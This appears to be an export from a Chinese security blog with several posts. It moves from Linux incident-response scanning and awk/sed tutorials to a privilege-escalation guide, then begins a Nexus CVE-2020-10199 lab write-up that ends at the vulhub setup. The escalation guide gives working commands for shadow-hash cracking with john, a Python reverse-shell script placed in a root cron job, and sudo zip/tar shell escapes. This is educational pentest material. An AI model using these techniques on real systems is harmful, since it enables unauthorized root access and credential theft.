<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">yum install -y clamav</span><br><span class="line"><span class="comment">#更新病毒库</span></span><br><span class="line">freshclam</span><br><span class="line"><span class="comment">#扫描方法</span></span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br><span class="line"><span class="comment">#扫描并杀毒</span></span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/<span class="built_in">local</span>/zabbix/sbin</span><br><span class="line"><span class="comment">#查看日志发现</span></span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></figure>

<h2 id="3、webshell查杀"><a href="#3、webshell查杀" class="headerlink" title="3、webshell查杀"></a>3、webshell查杀</h2><p>Linux 版：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">河马 WebShell 查杀：http://www.shellpub.com</span><br></pre></td></tr></table></figure>

<h2 id="4、RPM-check-检查"><a href="#4、RPM-check-检查" class="headerlink" title="4、RPM check 检查"></a>4、RPM check 检查</h2><p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></figure>



<p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">		S         文件大小是否改变</span><br><span class="line">		M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">		5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">		D         设备中，从代码是否改变</span><br><span class="line">		L         文件路径是否改变</span><br><span class="line">		U         文件的属主（所有者）是否改变</span><br><span class="line">		G         文件的属组是否改变</span><br><span class="line">		T         文件的修改时间是否改变</span><br></pre></td></tr></table></figure>



<p>如果命令被替换了，如果还原回来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询 ls 命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下</span><br><span class="line">cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失</span><br></pre></td></tr></table></figure>

<h2 id="5、Linux安全检查脚本"><a href="#5、Linux安全检查脚本" class="headerlink" title="5、Linux安全检查脚本"></a>5、Linux安全检查脚本</h2><p>Github 项目地址：</p>
<ul>
<li><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p>
</li>
<li><p><a href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></p>
</li>
<li><p><a href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></p>
</li>
</ul>
<p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p>
<h1 id="四、知识点补充"><a href="#四、知识点补充" class="headerlink" title="四、知识点补充"></a>四、知识点补充</h1><h2 id="1、awk命令"><a href="#1、awk命令" class="headerlink" title="1、awk命令"></a>1、awk命令</h2><p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。</p>
<p><strong>【语法】</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk [选项参数] <span class="string">&#x27;script&#x27;</span> var=value file(s)</span><br><span class="line">或</span><br><span class="line">awk [选项参数] -f scriptfile var=value file(s)</span><br></pre></td></tr></table></figure>

<p><strong>【选项参数说明】</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] -F fs or --field-separator fs</span><br><span class="line">指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F:。</span><br><span class="line"></span><br><span class="line">[+] -v var=value or --asign var=value</span><br><span class="line">赋值一个用户定义变量。</span><br><span class="line"></span><br><span class="line">[+] -f scripfile or --file scriptfile</span><br><span class="line">从脚本文件中读取awk命令。</span><br><span class="line"></span><br><span class="line">[+] -mf nnn and -mr nnn</span><br><span class="line">对nnn值设置内在限制，-mf选项限制分配给nnn的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。</span><br><span class="line"></span><br><span class="line">[+] -W compact or --compat, -W traditional or --traditional</span><br><span class="line">在兼容模式下运行awk。所以gawk的行为和标准的awk完全一样，所有的awk扩展都被忽略。</span><br><span class="line"></span><br><span class="line">[+] -W copyleft or --copyleft, -W copyright or --copyright</span><br><span class="line">打印简短的版权信息。</span><br><span class="line"></span><br><span class="line">[+] -W <span class="built_in">help</span> or --<span class="built_in">help</span>, -W usage or --usage</span><br><span class="line">打印全部awk选项和每个选项的简短说明。</span><br><span class="line"></span><br><span class="line">[+] -W lint or --lint</span><br><span class="line">打印不能向传统unix平台移植的结构的警告。</span><br><span class="line"></span><br><span class="line">[+] -W lint-old or --lint-old</span><br><span class="line">打印关于不能向传统unix平台移植的结构的警告。</span><br><span class="line"></span><br><span class="line">[+] -W posix</span><br><span class="line">打开兼容模式。但有以下限制，不识别：/x、函数关键字、func、换码序列以及当fs是一个空格时，将新行作为一个域分隔符；操作符**和**=不能代替^和^=；fflush无效。</span><br><span class="line"></span><br><span class="line">[+] -W re-interval or --re-inerval</span><br><span class="line">允许间隔正则表达式的使用，参考(grep中的Posix字符类)，如括号表达式[[:alpha:]]。</span><br><span class="line"></span><br><span class="line">[+] -W <span class="built_in">source</span> program-text or --<span class="built_in">source</span> program-text</span><br><span class="line">使用program-text作为源代码，可与-f命令混用。</span><br><span class="line"></span><br><span class="line">[+] -W version or --version</span><br><span class="line">打印bug报告信息的版本。</span><br></pre></td></tr></table></figure>

<p><strong>【基本用法】</strong></p>
<p>log.txt文本内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 this is a test</span><br><span class="line">3 Are you like awk</span><br><span class="line">This&#x27;s a test</span><br><span class="line">10 There are orange,apple,mongo</span><br></pre></td></tr></table></figure>

<p>​    用法一：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;[pattern] action&#125;&#x27;</span> &#123;filenames&#125;   <span class="comment"># 行匹配语句 awk &#x27;&#x27; 只能用单引号</span></span><br></pre></td></tr></table></figure>

<p>实例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 每行按空格或TAB分割，输出文本中的1、4项</span></span><br><span class="line"> $ awk <span class="string">&#x27;&#123;print $1,$4&#125;&#x27;</span> log.txt</span><br><span class="line"> ---------------------------------------------</span><br><span class="line"> 2 a</span><br><span class="line"> 3 like</span><br><span class="line"> This<span class="string">&#x27;s</span></span><br><span class="line"><span class="string"> 10 orange,apple,mongo</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> # 格式化输出</span></span><br><span class="line"><span class="string"> $ awk &#x27;</span>&#123;<span class="built_in">printf</span> <span class="string">&quot;%-8s %-10s\n&quot;</span>,<span class="variable">$1</span>,<span class="variable">$4</span>&#125;<span class="string">&#x27; log.txt</span></span><br><span class="line"><span class="string"> ---------------------------------------------</span></span><br><span class="line"><span class="string"> 2        a</span></span><br><span class="line"><span class="string"> 3        like</span></span><br><span class="line"><span class="string"> This&#x27;</span>s</span><br><span class="line"> 10       orange,apple,mongo</span><br></pre></td></tr></table></figure>

<p>用法二：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F  <span class="comment">#-F相当于内置变量FS, 指定分割字符</span></span><br><span class="line"><span class="comment"># 使用&quot;,&quot;分割</span></span><br><span class="line"> $  awk -F, <span class="string">&#x27;&#123;print $1,$2&#125;&#x27;</span>   log.txt</span><br><span class="line"> ---------------------------------------------</span><br><span class="line"> 2 this is a <span class="built_in">test</span></span><br><span class="line"> 3 Are you like awk</span><br><span class="line"> This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string"> 10 There are orange apple</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> # 或者使用内建变量</span></span><br><span class="line"><span class="string"> $ awk &#x27;</span>BEGIN&#123;FS=<span class="string">&quot;,&quot;</span>&#125; &#123;<span class="built_in">print</span> <span class="variable">$1</span>,<span class="variable">$2</span>&#125;<span class="string">&#x27;     log.txt</span></span><br><span class="line"><span class="string"> ---------------------------------------------</span></span><br><span class="line"><span class="string"> 2 this is a test</span></span><br><span class="line"><span class="string"> 3 Are you like awk</span></span><br><span class="line"><span class="string"> This&#x27;</span>s a <span class="built_in">test</span></span><br><span class="line"> 10 There are orange apple</span><br><span class="line"> </span><br><span class="line"> <span class="comment"># 使用多个分隔符.先使用空格分割，然后对分割结果再使用&quot;,&quot;分割</span></span><br><span class="line"> $ awk -F <span class="string">&#x27;[ ,]&#x27;</span>  <span class="string">&#x27;&#123;print $1,$2,$5&#125;&#x27;</span>   log.txt</span><br><span class="line"> ---------------------------------------------</span><br><span class="line"> 2 this <span class="built_in">test</span></span><br><span class="line"> 3 Are awk</span><br><span class="line"> This<span class="string">&#x27;s a</span></span><br><span class="line"><span class="string"> 10 There apple</span></span><br></pre></td></tr></table></figure>

<h2 id="2、sed命令"><a href="#2、sed命令" class="headerlink" title="2、sed命令"></a>2、sed命令</h2><p>Linux sed 命令是利用脚本来处理文本文件。</p>
<p>sed 可依照脚本的指令来处理、编辑文本文件。</p>
<p>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p>
<p><strong>【语法】</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件]</span><br></pre></td></tr></table></figure>

<p><strong>【参数说明】</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] -e&lt;script&gt;或--expression=&lt;script&gt; 以选项中指定的script来处理输入的文本文件。</span><br><span class="line">[+] -f&lt;script文件&gt;或--file=&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。</span><br><span class="line">[+] -h或--help 显示帮助。</span><br><span class="line">[+] -n或--quiet或--silent 仅显示script处理后的结果。</span><br><span class="line">[+] -V或--version 显示版本信息。</span><br></pre></td></tr></table></figure>

<p><strong>【动作说明】</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</span><br><span class="line">c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</span><br><span class="line">d ：删除，因为是删除啊，所以 d 后面通常不接任何东东；</span><br><span class="line">i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</span><br><span class="line">p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</span><br><span class="line">s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！ </span><br></pre></td></tr></table></figure>

<p><strong>【实例】</strong></p>
<p>在testfile文件的第四行后添加一行，并将结果输出到标准输出，在命令行提示符下输入如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -e 4a\newLine testfile</span><br></pre></td></tr></table></figure>

<p>首先查看testfile中的内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat testfile <span class="comment">#查看testfile 中的内容  </span></span><br><span class="line">HELLO LINUX!  </span><br><span class="line">Linux is a free unix-type opterating system.  </span><br><span class="line">This is a linux testfile!  </span><br><span class="line">Linux <span class="built_in">test</span> </span><br></pre></td></tr></table></figure>

<p>使用sed命令后，输出结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sed -e 4a\newline testfile <span class="comment">#使用sed 在第四行后添加新字符串  </span></span><br><span class="line">HELLO LINUX! <span class="comment">#testfile文件原有的内容  </span></span><br><span class="line">Linux is a free unix-type opterating system.  </span><br><span class="line">This is a linux testfile!  </span><br><span class="line">Linux <span class="built_in">test</span>  </span><br><span class="line">newline </span><br></pre></td></tr></table></figure>

<p><strong>【以行为单位的新增/删除】</strong></p>
<p>将 /etc/passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@www ~]<span class="comment"># nl /etc/passwd | sed &#x27;2,5d&#x27;</span></span><br><span class="line">1 root:x:0:0:root:/root:/bin/bash</span><br><span class="line">6 sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">.....(后面省略).....</span><br></pre></td></tr></table></figure>

<p>sed 的动作为 ‘2,5d’ ，那个 d 就是删除！因为 2-5 行给他删除了，所以显示的数据就没有 2-5 行罗～ 另外，注意一下，原本应该是要下达 sed -e 才对，没有 -e 也行啦！同时也要注意的是， sed 后面接的动作，请务必以 ‘’ 两个单引号括住喔！ </p>
<p>只要删除第 2 行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nl /etc/passwd | sed <span class="string">&#x27;2d&#x27;</span> </span><br></pre></td></tr></table></figure>

<p>要删除第 3 到最后一行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nl /etc/passwd | sed <span class="string">&#x27;3,$d&#x27;</span> </span><br></pre></td></tr></table></figure>

<p>在第二行后(亦即是加在第三行)加上『drink tea?』字样！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nl /etc/passwd | sed <span class="string">&#x27;2i drink tea&#x27;</span></span><br></pre></td></tr></table></figure>

<pre><code> 如果是要增加两行以上，在第二行后面加入两行字，例如 **Drink tea or .....** 与 **drink beer?**
</code></pre>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@www ~]<span class="comment"># nl /etc/passwd | sed &#x27;2a Drink tea or ......\</span></span><br><span class="line">&gt; drink beer ?<span class="string">&#x27;</span></span><br><span class="line"><span class="string">1 root:x:0:0:root:/root:/bin/bash</span></span><br><span class="line"><span class="string">2 bin:x:1:1:bin:/bin:/sbin/nologin</span></span><br><span class="line"><span class="string">Drink tea or ......</span></span><br><span class="line"><span class="string">drink beer ?</span></span><br><span class="line"><span class="string">3 daemon:x:2:2:daemon:/sbin:/sbin/nologin</span></span><br><span class="line"><span class="string">.....(后面省略).....</span></span><br></pre></td></tr></table></figure>

<p>每一行之间都必须要以反斜杠『 \ 』来进行新行的添加喔！所以，上面的例子中，我们可以发现在第一行的最后面就有 \ 存在。</p>
<p><strong>【以行为单位的替换与显示】</strong></p>
<p>将第2-5行的内容取代成为『No 2-5 number』呢？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@www ~]<span class="comment"># nl /etc/passwd | sed &#x27;2,5c No 2-5 number&#x27;</span></span><br><span class="line">1 root:x:0:0:root:/root:/bin/bash</span><br><span class="line">No 2-5 number</span><br><span class="line">6 sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">.....(后面省略).....</span><br></pre></td></tr></table></figure>

<p>透过这个方法我们就能够将数据整行取代了！ </p>
<p>仅列出 /etc/passwd 文件内的第 5-7 行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@www ~]<span class="comment"># nl /etc/passwd | sed -n &#x27;5,7p&#x27;</span></span><br><span class="line">5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">6 sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br></pre></td></tr></table></figure>

<p>可以透过这个 sed 的以行为单位的显示功能， 就能够将某一个文件内的某些行号选择出来显示。 </p>
<p><strong>【数据的搜寻并显示】</strong></p>
<p>搜索 /etc/passwd有root关键字的行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nl /etc/passwd | sed <span class="string">&#x27;/root/p&#x27;</span></span><br><span class="line">1  root:x:0:0:root:/root:/bin/bash</span><br><span class="line">1  root:x:0:0:root:/root:/bin/bash</span><br><span class="line">2  daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">3  bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">4  sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">5  sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">....下面忽略 </span><br></pre></td></tr></table></figure>

<p>如果root找到，除了输出所有行，还会输出匹配行。</p>
<p>使用-n的时候将只打印包含模板的行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nl /etc/passwd | sed -n <span class="string">&#x27;/root/p&#x27;</span></span><br><span class="line">1  root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<p><strong>【数据的搜寻并删除】</strong></p>
<p>删除/etc/passwd所有包含root的行，其他行输出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nl /etc/passwd | sed  <span class="string">&#x27;/root/d&#x27;</span></span><br><span class="line">2  daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">3  bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">....下面忽略</span><br><span class="line"><span class="comment">#第一行的匹配root已经删除了</span></span><br></pre></td></tr></table></figure>

<p><strong>【数据的搜寻并执行命令】</strong></p>
<p>搜索/etc/passwd，找到root对应的行，执行后面花括号中的一组命令，每个命令之间用分号分隔，这里把bash替换为blueshell，再输出这行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nl /etc/passwd | sed -n <span class="string">&#x27;/root/&#123;s/bash/blueshell/;p;q&#125;&#x27;</span>    </span><br><span class="line">1  root:x:0:0:root:/root:/bin/blueshell</span><br></pre></td></tr></table></figure>

<p>最后的q是退出。</p>
<p><strong>【数据的搜寻并替换】</strong></p>
<p>除了整行的处理模式之外， sed 还可以用行为单位进行部分数据的搜寻并取代。基本上 sed 的搜寻与替代的与 vi 相当的类似！他有点像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/要被取代的字串/新的字串/g&#x27;</span></span><br></pre></td></tr></table></figure>

<p>先观察原始信息，利用 /sbin/ifconfig 查询 IP</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@www ~]<span class="comment"># /sbin/ifconfig eth0</span></span><br><span class="line">eth0 Link encap:Ethernet HWaddr 00:90:CC:A6:34:84</span><br><span class="line">inet addr:192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0</span><br><span class="line">inet6 addr: fe80::290:ccff:fea6:3484/64 Scope:Link</span><br><span class="line">UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1</span><br><span class="line">.....(以下省略).....</span><br></pre></td></tr></table></figure>

<p>本机的ip是192.168.1.100。</p>
<p>将 IP 前面的部分予以删除</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@www ~]<span class="comment"># /sbin/ifconfig eth0 | grep &#x27;inet addr&#x27; | sed &#x27;s/^.*addr://g&#x27;</span></span><br><span class="line">192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0</span><br></pre></td></tr></table></figure>

<p>接下来则是删除后续的部分，亦即： 192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0 </p>
<p>将 IP 后面的部分予以删除</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@www ~]<span class="comment"># /sbin/ifconfig eth0 | grep &#x27;inet addr&#x27; | sed &#x27;s/^.*addr://g&#x27; | sed &#x27;s/Bcast.*$//g&#x27;</span></span><br><span class="line">192.168.1.100</span><br></pre></td></tr></table></figure>

<p><strong>【多点编辑】</strong></p>
<p>一条sed命令，删除/etc/passwd第三行到末尾的数据，并把bash替换为blueshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nl /etc/passwd | sed -e <span class="string">&#x27;3,$d&#x27;</span> -e <span class="string">&#x27;s/bash/blueshell/&#x27;</span></span><br><span class="line">1  root:x:0:0:root:/root:/bin/blueshell</span><br><span class="line">2  daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br></pre></td></tr></table></figure>

<p>-e表示多点编辑，第一个编辑命令删除/etc/passwd第三行到末尾的数据，第二条命令搜索bash替换为blueshell。</p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux提权的各种姿势</title>
    <url>/post/927dc08e.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、提权介绍"><a href="#一、提权介绍" class="headerlink" title="一、提权介绍"></a>一、提权介绍</h1><p>&emsp;&emsp;往往我们能拿下服务器的web服务只是具有低权限用户(www-data)，对于内网渗透，我们需要提权到root。Linux系统的提权过程不止涉及到了漏洞，也涉及了很多系统配置。</p>
<ul>
<li><p>提权前提:  </p>
<ul>
<li><p>已经拿到低权shell</p>
</li>
<li><p>被入侵的机器上面有nc，python，perl等linux非常常见的工具</p>
</li>
<li><p>有权限上传文件和下载文件</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639064411988-b659f170-ddff-496a-ad83-34975effb1ac.jpeg" alt="img"></p>
<h1 id="二、内核漏洞提权"><a href="#二、内核漏洞提权" class="headerlink" title="二、内核漏洞提权"></a>二、内核漏洞提权</h1><p>&emsp;&emsp;内核漏洞是我们几乎最先想到的提权方法。通杀的内核漏洞是十分少见的，因而我们应该先对系统相关的信息进行收集</p>
<ol>
<li>查看发行版本：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">lsb_release -a</span><br><span class="line">cat /etc/lsb-release</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看内核版本：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639063157058-0f0fff10-3514-4725-bec9-4f3b28636a50.png" alt="img"></p>
<ol start="3">
<li>找到系统版本号，通过kali的searchsploit查找该版本是否存在漏洞</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639063175462-bbbb593e-42dc-4455-bc22-23e5b8fdcbd6.png" alt="img"></p>
<ol start="4">
<li><p>发现不存在内核溢出代码</p>
</li>
<li><p>假若存在内核溢出代码，可通过如下命令，上传内核溢出代码，编译执行</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc xxx.c -o exploit [-lpthread]</span><br><span class="line">chmod +x exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>

<h1 id="三、明文root提权-通过passwd和shadow破译密码"><a href="#三、明文root提权-通过passwd和shadow破译密码" class="headerlink" title="三、明文root提权-通过passwd和shadow破译密码"></a>三、明文root提权-通过passwd和shadow破译密码</h1><p>&emsp;&emsp;大多linux系统的密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。</p>
<p>&emsp;&emsp;例如破解linux用户名和对应的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd /etc/shadow</span><br><span class="line">unshadow passwd shadow &gt; cracked</span><br><span class="line">john cracked </span><br></pre></td></tr></table></figure>

<h1 id="四、计划任务"><a href="#四、计划任务" class="headerlink" title="四、计划任务"></a>四、计划任务</h1><p>&emsp;&emsp;系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。<strong>非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出</strong></p>
<p>&emsp;&emsp;使用命令：<code>cat /etc/crontab</code> 回车查看计划任务</p>
<p>&emsp;&emsp; 默认这些程序以root权限执行，<strong>如果有幸遇到一个把其中脚本配置成任意用户可写的管理员，我们就可以修改脚本等回连root shell</strong>；如果定时执行的文件是py脚本，可以使用以下的脚本来替换之前的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line">s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;攻击机IP地址&quot;</span>,<span class="string">&quot;攻击机监听端口&quot;</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;攻击机启动nc监听端口：<code>nc -nlvp port</code></p>
<h1 id="五、密码复用"><a href="#五、密码复用" class="headerlink" title="五、密码复用"></a>五、密码复用</h1><p>&emsp;&emsp;很多管理员会重复使用密码，因此数据库或者web后台的密码也许就是root密码。</p>
<p>&emsp;&emsp;有了（疑似)） root密码怎么办？你一定想ssh登陆。然而ssh很可能禁止root登陆，或是防火墙规则将你排除在外了。返回来想，我们不是有一个低权shell了吗？找个办法在上面“输入”密码就好了。显然，直接在低权shell里面用sudo是不奏效的。这是因为出于安全考虑linux要求用户必须从终端设备（tty）中输入密码，而不是标准输入(stdin）。换句话说，sudo在你输入密码的时候本质上是读取了键盘，而不是bash里面输入的字符。因此为了能够输入密码，我们必须模拟一个终端设备。python就有这样的功能。在shell里面输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="六、zip、rar提权"><a href="#六、zip、rar提权" class="headerlink" title="六、zip、rar提权"></a>六、zip、rar提权</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo –l 发现可以使用root执行zip和tar命令</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;利用zip进行提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch exploit     新建exploit文件</span><br><span class="line">sudo -u root zip exploit.zip exploit -T -unzip -<span class="built_in">command</span>=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;利用tar进行提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u root tar cf /dev/null exploit -checkpoint=1 --checkpoint -action=<span class="string">&quot;/bin/bash&quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-10199：Nexus Repository Manager 3 group后台远程命令执行漏洞</title>
    <url>/post/bddc5cf6.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>nexus的全称是Nexus Repository Manager，是Sonatype公司的一个产品。它是一个强大的仓库管理器，极大地简化了内部仓库的维护和外部仓库的访问。</p>
<p>主要用它来搭建公司内部的maven私服。但是它的功能不仅仅是创建maven私有仓库这么简单，还可以作为nuget、docker、npm、bower、pypi、rubygems、git lfs、yum、go、apt等的私有仓库，功能非常强大。</p>
<h1 id="二、漏洞概述"><a href="#二、漏洞概述" class="headerlink" title="二、漏洞概述"></a>二、漏洞概述</h1><p>在 Nexus Repository Manager OSS/Pro 3.21.1 及之前的版本中，由于后台存在一处任意EL表达式注入漏洞，导致经过授权认证的攻击者，可以在远程通过构造恶意的 HTTP 请求，在服务端执行任意恶意代码，获取系统权限。<strong>此漏洞的利用需要攻击者具备任意类型的账号权限</strong>。</p>
<h1 id="三、影响版本"><a href="#三、影响版本" class="headerlink" title="三、影响版本"></a>三、影响版本</h1><p>Nexus Repository Manager OSS/Pro 3.x &lt;= 3.21.1</p>
<h1 id="四、网络测绘"><a href="#四、网络测绘" class="headerlink" title="四、网络测绘"></a>四、网络测绘</h1><p>app=”Nexus-Repository-Manager”</p>
<h1 id="五、环境部署"><a href="#五、环境部署" class="headerlink" title="五、环境部署"></a>五、环境部署</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/vulhub/nexus/CVE-2020-10199</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>

